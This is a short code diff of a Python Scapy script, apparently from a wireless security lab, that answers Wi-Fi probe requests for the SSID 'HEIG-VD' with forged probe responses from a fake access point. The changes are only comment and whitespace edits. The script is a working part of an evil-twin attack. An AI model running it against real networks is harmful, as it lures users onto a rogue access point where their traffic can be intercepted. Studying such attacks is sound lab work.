@@ -1,7 +1,7 @@
 
 from scapy.layers.dot11 import *
 
-INTERFACE = "wlx00c0ca6b5921"             # Interface to use
+INTERFACE = "wlx00c0ca6b5921"   # Interface to use
 AP_MAC = "11:22:33:44:55:66"    # MAC address of the fake access point
 SSID = "HEIG-VD"                # Probe Requests to answer to
 
@@ -14,13 +14,9 @@ def targeted_evil_twin(pkt):
             # Get the MAC addresses of the probe request
             client_mac = pkt.getlayer(Dot11).addr2
 
-            # Create a probe response
+            # Create a probe response frame
             probe_resp = Dot11(type=0, subtype=5, addr1=client_mac, addr2=AP_MAC, addr3=AP_MAC)
-
-            # Create the SSID element
             ssid = Dot11Elt(ID="SSID", info=SSID, len=len(SSID))
-
-            # Create the frame
             frame = RadioTap() / probe_resp / ssid
 
             # Send the frame
@@ -29,4 +25,3 @@ def targeted_evil_twin(pkt):
 if __name__ == '__main__':
     # Sniff network
     sniff(iface=INTERFACE, prn=targeted_evil_twin)
-
